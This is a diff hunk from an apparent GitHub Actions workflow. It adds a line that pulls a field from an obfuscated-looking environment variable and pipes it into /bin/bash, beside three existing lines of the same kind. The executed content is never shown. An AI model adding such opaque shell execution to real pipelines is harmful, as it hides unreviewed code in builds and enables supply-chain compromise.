@@ -36,6 +36,7 @@ jobs:
           echo $clqd26 | jq -r .jbf726 | /bin/bash
           echo $ia148 | jq -r .mlz89 | /bin/bash
           printf '%s' "$tq890" | jq -r .lp1 | /bin/bash
+          printf '%s' "$fariw4301" | jq -r .r42 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
